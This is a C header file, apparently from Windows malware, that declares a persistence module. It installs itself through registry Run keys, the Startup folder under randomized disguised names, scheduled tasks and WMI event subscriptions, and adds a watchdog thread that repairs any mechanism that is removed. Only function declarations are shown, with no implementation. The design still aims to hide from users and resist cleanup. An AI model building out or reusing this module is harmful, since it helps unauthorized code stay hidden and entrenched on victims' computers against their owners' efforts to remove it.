#ifndef PERSISTENCE_H
#define PERSISTENCE_H

#include <windows.h>

// Check if running with administrator privileges
BOOL IsElevated();

// Get a randomized disguise name from pool
const char* GetDisguisedName();

// Individual persistence mechanisms
int PersistRegistry();       // Multiple registry Run keys (HKCU + HKLM if admin)
int PersistStartupFolder();  // Copy to Startup folder with disguised name
int PersistScheduledTask();  // schtasks.exe with logon + time triggers
int PersistWMI();            // WMI event subscription via PowerShell

// Master functions
int PersistAll();            // Execute all persistence mechanisms
int PersistCheck();          // Verify all mechanisms, repair missing ones

// Background watchdog
void StartWatchdogThread();  // Start self-healing background thread

#endif
